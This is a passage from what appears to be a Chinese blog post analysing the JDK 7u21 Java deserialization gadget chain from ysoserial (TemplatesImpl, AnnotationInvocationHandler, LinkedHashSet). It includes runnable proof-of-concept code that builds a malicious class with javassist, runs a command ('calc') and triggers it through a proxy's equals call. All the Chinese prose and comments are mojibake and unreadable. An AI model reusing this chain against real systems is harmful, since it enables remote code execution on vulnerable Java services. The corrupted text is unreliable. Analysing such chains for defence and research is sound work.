        for(int i &#x3D; 0; i &lt; classCount; ++i) &#123;</span><br><span class="line">                    this._class[i] &#x3D; loader.defineClass(this._bytecodes[i]);  \\å°†_bytecodesä¸­çš„æ‰€æœ‰å­—èŠ‚é€šè¿‡defineClassè½¬åŒ–ä¸ºä¸€ä¸ªç±»</span><br><span class="line">                    Class superClass &#x3D; this._class[i].getSuperclass();</span><br><span class="line">                    if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                        this._transletIndex &#x3D; i;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        this._auxClasses.put(this._class[i].getName(), this._class[i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´é€šè¿‡è¿™ä¸ªæ–¹æ³•å¯ä»¥å°†_bytecodesæ•°ç»„ä¸­çš„å­—èŠ‚è¿˜åŸæˆä¸€ä¸ªç±»ï¼Œå­˜å‚¨åˆ°_classå˜é‡ä¸­ã€‚æ¥ä¸‹æ¥å¦‚æœæˆ‘ä»¬èƒ½æ‰¾åˆ°è°ƒç”¨defineTransletClassesæ–¹æ³•å¹¶æ‰§è¡Œäº†_class[].newinstance() è¿™æ ·çš„çš„ä»£ç çš„æ–¹æ³•ï¼Œå°±èƒ½å®ä¾‹åŒ–ä»å­—èŠ‚å¾—åˆ°çš„ç±»äº†ï¼Œä»è€Œå°±èƒ½æ‰§è¡Œç±»ä¸­çš„é™æ€ä»£ç å—å’Œæ„é€ å‡½æ•°äº†ï¼<br>æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å»å¯»æ‰¾è¿™ç§æ–¹æ³•ã€‚<br>é€šè¿‡æœç´¢defineTransletClassesï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†æœ‰å¦‚ä¸‹ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨äº†defineTransletClassesæ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getTransletInstance</span><br><span class="line">getTransletIndex</span><br><span class="line">getTransletClasses</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼ŒgetTransletInstanceæ–¹æ³•æ˜¯å”¯ä¸€ç¬¦åˆâ€œè°ƒç”¨äº†defineTransletClassesä¸”æœ‰_class[].newinstance()â€çš„æ–¹æ³•ï¼Œå…¶ä»£ç å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private Translet getTransletInstance() throws TransformerConfigurationException &#123;</span><br><span class="line">        ErrorMsg err;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (this._name &#x3D;&#x3D; null) &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (this._class &#x3D;&#x3D; null) &#123;</span><br><span class="line">                    this.defineTransletClasses();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                AbstractTranslet translet &#x3D; (AbstractTranslet)this._class[this._transletIndex].newInstance(); \\here</span><br><span class="line">                translet.postInitialization();</span><br><span class="line">                translet.setTemplates(this);</span><br><span class="line">                translet.setServicesMechnism(this._useServicesMechanism);</span><br><span class="line">                if (this._auxClasses !&#x3D; null) &#123;</span><br><span class="line">                    translet.setAuxiliaryClasses(this._auxClasses);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                return translet;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆï¼ŒgetTransletInstanceæ˜¯ä¸€ä¸ªprivateæ–¹æ³•ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è°ƒç”¨å®ƒï¼Œåœ¨é‚£é‡Œèƒ½å»è°ƒç”¨å®ƒå‘¢ï¼Ÿç­”æ¡ˆæ˜¯newTransformeræ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  public synchronized Transformer newTransformer() throws TransformerConfigurationException &#123;</span><br><span class="line">      TransformerImpl transformer &#x3D; new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory);  \\here</span><br><span class="line">Â·Â·Â·Â·Â·Â·Â·Â·</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>OK.æˆ‘ä»¬æ‰¾åˆ°äº†è§¦å‘7u21é“¾çš„ä¸€ä¸ªæ ¸å¿ƒç‚¹äº†ã€‚æˆ‘ä»¬å†™ä¸ªå°demoæ¥é€šè¿‡TemplatesImplå®ç°ä»£ç æ‰§è¡Œ<br>å°demoçš„å®ç°æ€è·¯ä¸ºï¼šé€šè¿‡javassiståŠ¨æ€ç”Ÿæˆä¸€ä¸ªæ¶æ„ç±»ï¼ˆæ„é€ æ–¹æ³•æˆ–è€…é™æ€ä»£ç å—æœ‰æ¶æ„ä»£ç ï¼‰ï¼Œç„¶åé€šè¿‡åå°„ç”Ÿæˆä¸€ä¸ªTemplatesImplå¯¹è±¡å¹¶è®¾ç½®å„ä¸ªå˜é‡çš„å€¼ï¼Œç„¶åè°ƒç”¨ä¸€ä¸‹TemplatesImplå¯¹è±¡çš„newTransformeræ–¹æ³•å³å¯é€ æˆä»£ç æ‰§è¡Œï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class test&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">        CtClass cc &#x3D; pool.makeClass(&quot;evilclass&quot;);</span><br><span class="line">        String cmd &#x3D; &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd); \\å‘é™æ€ä»£ç å—æ’å…¥æ¶æ„ä»£ç ï¼Œæ’å…¥åˆ°æ„é€ å‡½æ•°ä¹Ÿå¯ä»¥</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));  \\éœ€è®¾ç½®æ­¤é¡¹æ‰èƒ½å®ç°newinstanceï¼Œå…·ä½“åŸå› è¯·çœ‹defineTransletClasseså’ŒgetTransletInstanceæºç </span><br><span class="line">        cc.setName(&quot;evilClass&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        byte[] evilbytes &#x3D; cc.toBytecode();</span><br><span class="line">        byte[][] targetByteCodes &#x3D; new byte[][]&#123;evilbytes&#125;;</span><br><span class="line">        TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance();</span><br><span class="line">        Class clazz &#x3D; TemplatesImpl.class.newInstance().getClass();</span><br><span class="line">        Field[] Fields &#x3D; clazz.getDeclaredFields();</span><br><span class="line">        for (Field Field : Fields) &#123; &#x2F;&#x2F;éå†Fieldsæ•°ç»„</span><br><span class="line">            try &#123; </span><br><span class="line">                Field.setAccessible(true);  &#x2F;&#x2F;å¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹å®ç°ç§æœ‰è®¿é—®</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_bytecodes&quot;)&#123;</span><br><span class="line">                    Field.set(templates,targetByteCodes);</span><br><span class="line">                &#125;</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_class&quot;)&#123;</span><br><span class="line">                    Field.set(templates,null);</span><br><span class="line">                &#125;</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_name&quot;)&#123;</span><br><span class="line">                    Field.set(templates,&quot;abc&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_tfactory&quot;)&#123;</span><br><span class="line">                    Field.set(templates,new TemplatesImpl());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Exception e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†ä»…ä»…æ˜¯è¿™æ ·ï¼Œè‚¯å®šæ˜¯ä¸å¤Ÿçš„ã€‚</p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>æˆ‘ä»¬ç»§ç»­çœ‹ysoserialæºç å¯ä»¥çœ‹åˆ°åŠ¨ç”¨äº†AnnotationInvocationHandlerè¿™ä¸ªä¸œè¥¿.è¿™ä¸ªç±»åŸæœ¬çš„ä½œç”¨æ˜¯ä½œä¸ºAnnotation ç±»çš„åŠ¨æ€ä»£ç†</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330014037679.png" alt="image-20210330014037679"></p><p>æˆ‘ä»¬æŠŠç›®å…‰èšç„¦äºinvokeæ–¹æ³•â€”â€”åŠ¨æ€ä»£ç†çš„æ ¸å¿ƒ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Object invoke(Object var1, Method var2, Object[] var3) &#123;</span><br><span class="line">     String var4 &#x3D; var2.getName();</span><br><span class="line">     Class[] var5 &#x3D; var2.getParameterTypes();</span><br><span class="line">     if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length &#x3D;&#x3D; 1 &amp;&amp; var5[0] &#x3D;&#x3D; Object.class) &#123;</span><br><span class="line">         return this.equalsImpl(var3[0]);</span><br><span class="line">     &#125; </span><br><span class="line">     ..........</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>å®ƒä¼šæ£€æµ‹ä¼ å…¥çš„æ–¹æ³•ä¸­æ˜¯å¦æœ‰ç¬¦åˆ åä¸ºequalsï¼Œåªæœ‰ä¸€ä¸ªObjectç±»å‹å‚æ•°ã€‚è‹¥æ˜¯ï¼Œåˆ™è°ƒç”¨equalsImplæ–¹æ³•å¹¶ä¼ å…¥æ–¹æ³•ä¸­çš„å‚æ•°ã€‚<br>è·Ÿè¿›equalsimplæ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private Boolean equalsImpl(Object var1) &#123;</span><br><span class="line">    if (var1 &#x3D;&#x3D; this) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125; else if (!this.type.isInstance(var1)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        Method[] var2 &#x3D; this.getMemberMethods();</span><br><span class="line">        int var3 &#x3D; var2.length;</span><br><span class="line"></span><br><span class="line">        for(int var4 &#x3D; 0; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">            Method var5 &#x3D; var2[var4];</span><br><span class="line">            String var6 &#x3D; var5.getName();</span><br><span class="line">            Object var7 &#x3D; this.memberValues.get(var6);</span><br><span class="line">            Object var8 &#x3D; null;</span><br><span class="line">            AnnotationInvocationHandler var9 &#x3D; this.asOneOfUs(var1);</span><br><span class="line">            if (var9 !&#x3D; null) &#123;</span><br><span class="line">                var8 &#x3D; var9.memberValues.get(var6);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    var8 &#x3D; var5.invoke(var1);   \\here</span><br><span class="line">                &#125; catch (InvocationTargetException var11) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125; catch (IllegalAccessException var12) &#123;</span><br><span class="line">                    throw new AssertionError(var12);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°ä¼šinvoke ä¼ å…¥å‚æ•°ä¸­çš„æ‰€æœ‰æ–¹æ³•ã€‚<br>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥æŒ‰ç…§ä¸‹é¢çš„æ€è·¯å†™ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå°demo:</p><p>åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„TemplatesImplå®ä¾‹ï¼Œé€šè¿‡AnnotationInvocationHandleråˆ›å»ºä»»æ„ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œç„¶åä»£ç†å¯¹è±¡è°ƒç”¨equalsæ–¹æ³•ä¼ å…¥å‚æ•°ä¸ºæ¶æ„TemplatesImplå¯¹è±¡ï¼Œå³å¯é€ æˆæ¶æ„ä»£ç æ‰§è¡Œ<br>çœ‹åˆ°è¿™é‡Œä¸€å®šä¸€å¤´é›¾æ°´ï¼Œçœ‹çœ‹demoä¹Ÿè®¸ä¼šå¥½ä¸€ç‚¹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class test&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">        CtClass cc &#x3D; pool.makeClass(&quot;evilclass&quot;);</span><br><span class="line">        String cmd &#x3D; &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;</span><br><span class="line">        CtConstructor cons &#x3D; new CtConstructor(new CtClass[]&#123;&#125;,cc);</span><br><span class="line">        cons.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        cc.setName(&quot;evilClass&quot;);</span><br><span class="line"></span><br><span class="line">        byte[] evilbytes &#x3D; cc.toBytecode();</span><br><span class="line">        byte[][] targetByteCodes &#x3D; new byte[][]&#123;evilbytes&#125;;</span><br><span class="line">        TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance();</span><br><span class="line">        Class clazz &#x3D; TemplatesImpl.class.newInstance().getClass();</span><br><span class="line">        Field[] Fields &#x3D; clazz.getDeclaredFields();</span><br><span class="line">        for (Field Field : Fields) &#123; &#x2F;&#x2F;éå†Fieldsæ•°ç»„</span><br><span class="line">            try &#123; &#x2F;&#x2F;æ‰§è¡Œget()æ–¹æ³•æ—¶éœ€æŠ›å‡ºIllegalAccessExceptioné”™è¯¯</span><br><span class="line">                Field.setAccessible(true);  &#x2F;&#x2F;å¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹å®ç°ç§æœ‰è®¿é—®</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_bytecodes&quot;)&#123;</span><br><span class="line">                    Field.set(templates,targetByteCodes);</span><br><span class="line">                &#125;</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_class&quot;)&#123;</span><br><span class="line">                    Field.set(templates,null);</span><br><span class="line">                &#125;</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_name&quot;)&#123;</span><br><span class="line">                    Field.set(templates,&quot;abc&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_tfactory&quot;)&#123;</span><br><span class="line">                    Field.set(templates,new TemplatesImpl());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Exception e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#x2F;&#x2F;ä»¥ä¸Šä»£ç ç”Ÿæˆäº†æ¶æ„TemplatesImplå¯¹è±¡templates</span><br><span class="line"></span><br><span class="line">        Map map &#x3D; new HashMap();</span><br><span class="line">        final Constructor&lt;?&gt; ctor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];  &#x2F;&#x2F;è·å¾—AnnotationInvocationHandleræ„é€ æ–¹æ³•ï¼Œæ–¹ä¾¿è·å¾—å®ƒä¸€ä¸ªå®ä¾‹</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        InvocationHandler invocationHandler &#x3D; (InvocationHandler) ctor.newInstance(Templates.class, map);  &#x2F;&#x2F;è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆè¦ä¼ å…¥Templatesç±»å¯¹è±¡è€Œä¸æ˜¯TemplatesImpl</span><br><span class="line">        Object proxy &#x3D; Proxy.newProxyInstance(null, Object.class.getInterfaces(), invocationHandler);  \\åæ­£åˆ›å»ºä¸€ä¸ªAnnotationInvocationHandlerçš„ä»£ç†å¯¹è±¡å°±è¡Œäº†ï¼Œå‰ä¸¤ä¸ªå‚æ•°éƒ½ä¸ç”¨æ€ä¹ˆç®¡</span><br><span class="line">        proxy.equals(templates); &#x2F;&#x2F;æ¶æ„ä»£ç æ‰§è¡Œ</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ…¢æ…¢çœ‹çœ‹é€»è¾‘ï¼Œåœ¨proxy.equalså¤„ä¸‹æ–­ç‚¹ï¼Œè°ƒè¯•<br>æ¯«æ— ç–‘é—®ä¼šè¿›å…¥åˆ°æ­¤å¤„ï¼šAnnotationInvocationHandlerçš„invokeæ–¹æ³•ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330012424056.png" alt="image-20210330012424056"></p><p>ç„¶åå‚æ•°ç¬¦åˆifåˆ¤æ–­ï¼Œè°ƒç”¨equalsImplæ–¹æ³•ï¼Œå¹¶ä¼ å…¥å‚æ•°ä¸ºæ¶æ„TemplatesImplå¯¹è±¡ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¿›å…¥åå°„è°ƒç”¨å¤„</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330012648729.png" alt="image-20210330012648729"></p><p>éå†var2å˜é‡ä¸­çš„æ–¹æ³•ï¼Œå¹¶ç”±æˆ‘ä»¬çš„æ¶æ„å¯¹è±¡æ¥æ‰§è¡Œã€‚</p><p>â€”â€”â€”â€”æ­¤å¤„æ’ä¸€ä¸‹var2å˜é‡çš„æ¥å†</p><p>æ³¨æ„æ­¤å¤„çš„getMemberMethodsæ–¹æ³•ï¼Œå®ƒå®è´¨ä¸Šæ˜¯é€šè¿‡åå°„è·å¾—this.typeä¸­çš„æ‰€æœ‰æ–¹æ³•ã€‚è€Œthis.typeæ˜¯åœ¨è¯¥å¯¹è±¡æ„é€ æ–¹æ³•ä¸­ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p><p>getMemberMethodsï¼š</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330012934623.png" alt="image-20210330012934623"></p><p>æ„é€ æ–¹æ³•ï¼š</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330012959824.png" alt="image-20210330012959824"></p><p>â€”â€”â€”â€”å›åˆ°æ­£é¢˜</p><p>ç”±äºæˆ‘ä»¬é€šè¿‡åå°„ä¼ å…¥æ„é€ æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Templates.classï¼Œæ‰€ä»¥å®ƒä¼šéå†Templatesç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•ã€‚è¿™ä¸ªç±»å…¶å®æ˜¯TemplatesImplçš„æ¥å£ç±»ï¼Œå®ƒçš„ä»£ç å¦‚ä¸‹</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330013201875.png" alt="image-20210330013201875"></p><p>æ‰€ä»¥var2ä¸­å­˜å‚¨çš„æ–¹æ³•åªæœ‰ä¸¤ä¸ªï¼ŒnewTransformerå’ŒgetOutputPropertiesã€‚<br>ç„¶åå½“éå†åˆ°newTransformeræ–¹æ³•æ—¶ï¼Œå°±ä¼šé€šè¿‡åå°„è°ƒç”¨è¾¾åˆ°  eviltemplatesImpl.newTransformer() çš„æ•ˆæœï¼Œä»è€Œå¯¼è‡´æ¶æ„TemplatesImplå¯¹è±¡ä¸­çš„æ¶æ„ä»£ç è¢«æ‰§è¡Œã€‚</p><p>è¿™é‡Œæ‰¿æ¥ä¸Šé¢è¯´çš„ï¼Œä¸ºä»€ä¹ˆåˆå§‹åŒ–AnnotationInvocationHandlerå¯¹è±¡æ—¶ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå³this.type)æ˜¯Templates.classï¼Œè€Œä¸æ˜¯TemplatesImpl.class<br>è¯šç„¶ï¼Œè¿™ä¸¤ä¸ªç±»å¯¹è±¡éƒ½æœ‰æ–¹æ³•newTransformerã€‚ä½†æ˜¯å¦‚æœä¼ å…¥TemplatesImpl.classï¼Œåœ¨éå†å…¶ä¸­æ–¹æ³•å¹¶é€šè¿‡åå°„æ‰§è¡Œæ—¶ä¼šå‡ºç°é”™è¯¯ï¼šequalsImplä¸­çš„åå°„è°ƒç”¨æ˜¯ä¸ä¼ å…¥å‚æ•°çš„</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330013705054.png" alt="image-20210330013705054"></p><p>è€ŒTemplatesImplä¸­æœ‰è®¸å¤šéœ€è¦ä¼ å…¥å‚æ•°æ‰èƒ½è¢«æ­£å¸¸ä½¿ç”¨çš„æ–¹æ³•ï¼Œå¦‚æœä¸ä¼ å…¥å‚æ•°å°±åå°„è°ƒç”¨å°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œä»¥è‡³äºåœ¨éå†åˆ°newTransformeræ–¹æ³•å‰å°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œä»è€Œå¯¼è‡´ä»£ç æ‰§è¡Œä¸è¢«å®ç°ã€‚</p><p>ä»…ä»…æ˜¯è¿™æ ·ï¼Œä¹Ÿè¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¾—æ‰‹åŠ¨è°ƒç”¨equalsæ‰èƒ½å¯¼è‡´ä»£ç æ‰§è¡Œï¼Œååºåˆ—åŒ–ç‚¹åœ¨å“ªé‡Œï¼Ÿ</p><h2 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h2><p>ysoserialçš„payloadä¸­å‡ºç°äº†æ­¤ç±»ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330014015703.png" alt="image-20210330014015703"></p><p>LinkedHashSetç»§æ‰¿è‡ªHashSetç±»ï¼Œå®ƒçš„readObjectæ–¹æ³•ä¹Ÿæ˜¯ä»HashSetç»§æ‰¿è€Œæ¥çš„ã€‚æˆ‘ä»¬çœ‹çœ‹readObjectæ–¹æ³•çš„æ„é€ </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        int var2 &#x3D; var1.readInt();</span><br><span class="line">        float var3 &#x3D; var1.readFloat();</span><br><span class="line">        this.map &#x3D; (HashMap)(this instanceof LinkedHashSet ? new LinkedHashMap(var2, var3) : new HashMap(var2, var3));</span><br><span class="line">        int var4 &#x3D; var1.readInt();</span><br><span class="line"></span><br><span class="line">        for(int var5 &#x3D; 0; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">            Object var6 &#x3D; var1.readObject();</span><br><span class="line">            this.map.put(var6, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒçš„ä¸»è¦äº®ç‚¹åœ¨forå¾ªç¯é‡Œé¢ï¼šéå†ä¼ å…¥çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œå°†å…¶ååºåˆ—åŒ–åï¼Œå†ä¼ å…¥putæ–¹æ³•</p><p>æ‰€ä»¥æˆ‘ä»¬å†æ¥è·Ÿè¿›ä¸€ä¸‹map.putæ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public V put(K var1, V var2) &#123;</span><br><span class="line">    if (var1 &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return this.putForNullKey(var2);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        int var3 &#x3D; this.hash(var1);</span><br><span class="line">        int var4 &#x3D; indexFor(var3, this.table.length);</span><br><span class="line"></span><br><span class="line">        for(HashMap.Entry var5 &#x3D; this.table[var4]; var5 !&#x3D; null; var5 &#x3D; var5.next) &#123;</span><br><span class="line">            Object var6;</span><br><span class="line">            if (var5.hash &#x3D;&#x3D; var3 &amp;&amp; ((var6 &#x3D; var5.key) &#x3D;&#x3D; var1 || var1.equals(var6))) &#123;  &#x2F;&#x2F;here</span><br><span class="line">                Object var7 &#x3D; var5.value;</span><br><span class="line">                var5.value &#x3D; var2;</span><br><span class="line">                var5.recordAccess(this);</span><br><span class="line">                return var7;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ++this.modCount;</span><br><span class="line">        this.addEntry(var3, var1, var2, var4);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„æˆ‘ä»¬æ·»åŠ æ³¨é‡Šé‚£ä¸€è¡Œï¼Œæœ‰ä¸€ä¸ªvar1.equals(var6)))  å…¶ä¸­var1å’Œvar6æˆ‘ä»¬éƒ½æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼švar1å³ä¼ å…¥çš„ååºåˆ—åŒ–å¯¹è±¡(æ¶æ„TemplatesImpl)ï¼Œvar6å®é™…ä¸Šä¹Ÿæ˜¯æˆ‘ä»¬ä¼ å…¥çš„ååºåˆ—åŒ–å¯¹è±¡ï¼ˆæ¶æ„AnnotationInvocationHandlerä»£ç†å¯¹è±¡ï¼‰ã€‚ </p><p>ä½†æ˜¯æƒ³è¦æ‰§è¡Œvar1.equals(var6))) åˆ™å¿…é¡»è¦è®©  var5.hash == var3 ä¸ºtrue ä¸” (var6 = var5.key) == var1ä¸ºfalse.<br>æ€ä¹ˆåšåˆ°å‘¢ï¼Ÿ</p><p>æ³¨æ„putæ–¹æ³•çš„ç¬¬5è¡Œï¼Œå¯¹ä¼ å…¥çš„ååºåˆ—åŒ–å¯¹è±¡è°ƒç”¨äº†hashæ–¹æ³•ã€‚æˆ‘ä»¬è·Ÿè¿›hashæ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">final int hash(Object var1) &#123;</span><br><span class="line">    int var2 &#x3D; 0;</span><br><span class="line">    if (this.useAltHashing) &#123;</span><br><span class="line">        if (var1 instanceof String) &#123;</span><br><span class="line">            return Hashing.stringHash32((String)var1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var2 &#x3D; this.hashSeed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var2 ^&#x3D; var1.hashCode();  &#x2F;&#x2F;here</span><br><span class="line">    var2 ^&#x3D; var2 &gt;&gt;&gt; 20 ^ var2 &gt;&gt;&gt; 12;</span><br><span class="line">    return var2 ^ var2 &gt;&gt;&gt; 7 ^ var2 &gt;&gt;&gt; 4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°ä¼šæ‰§è¡Œä¼ å…¥çš„å‚æ•°å¯¹è±¡çš„hashCode()æ–¹æ³•<br>å½“æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ä¸ºæ¶æ„AnnotationInvocationHandlerä»£ç†å¯¹è±¡æ—¶ï¼Œä¼šè°ƒç”¨ä»£ç†å¯¹è±¡ä¸­çš„invokeæ–¹æ³•ã€‚å¯¹äºAnnotationInvocationHandlerè€Œè¨€å½“åˆ¤æ–­åˆ°æ‰§è¡ŒhashCodeæ–¹æ³•æ—¶ï¼Œå®è´¨ä¸Šä¼šæ‰§è¡ŒAnnotationInvocationHandlerä¸­çš„hashCodeImplæ–¹æ³•</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330155159938.png" alt="image-20210330155159938"></p><p>æˆ‘ä»¬è·Ÿè¿›hashCodeImpl</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    private int hashCodeImpl() &#123;</span><br><span class="line">        int var1 &#x3D; 0;</span><br><span class="line"></span><br><span class="line">        Entry var3;</span><br><span class="line">        for(Iterator var2 &#x3D; this.memberValues.entrySet().iterator(); var2.hasNext(); var1 +&#x3D; 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;</span><br><span class="line">            var3 &#x3D; (Entry)var2.next();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return var1;</span><br><span class="line">    &#125;</span><br><span class="line">ä¸Šé¢æ˜¯çœŸå®ä»£ç ï¼Œæ¯”è¾ƒéš¾çœ‹ï¼Œæ‰€ä»¥å€Ÿé‰´äº†ä¸€ä¸‹åˆ«äººå¯¹å…¶è¿›è¡Œä¿®æ”¹åçš„ä»£ç ï¼Œæ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œåˆ†æ</span><br><span class="line">private int hashCodeImpl() &#123;</span><br><span class="line">  int result &#x3D; 0;</span><br><span class="line">  &#x2F;&#x2F; éå† memberValues</span><br><span class="line">  Iterator itr &#x3D; this.memberValues.entrySet().iterator();</span><br><span class="line">  for( ;itr.hasNext(); ) &#123;</span><br><span class="line">      Entry entry &#x3D; (Entry)itr.next();</span><br><span class="line">      String key &#x3D; ((String)entry.getKey());</span><br><span class="line">      Object value &#x3D; entry.getValue();</span><br><span class="line">      &#x2F;&#x2F; 127 * key çš„ hashCodeï¼Œå†å’Œ memberValueHashCode(value) è¿›è¡Œå¼‚æˆ–</span><br><span class="line">      result +&#x3D; 127 * key.hashCode() ^ 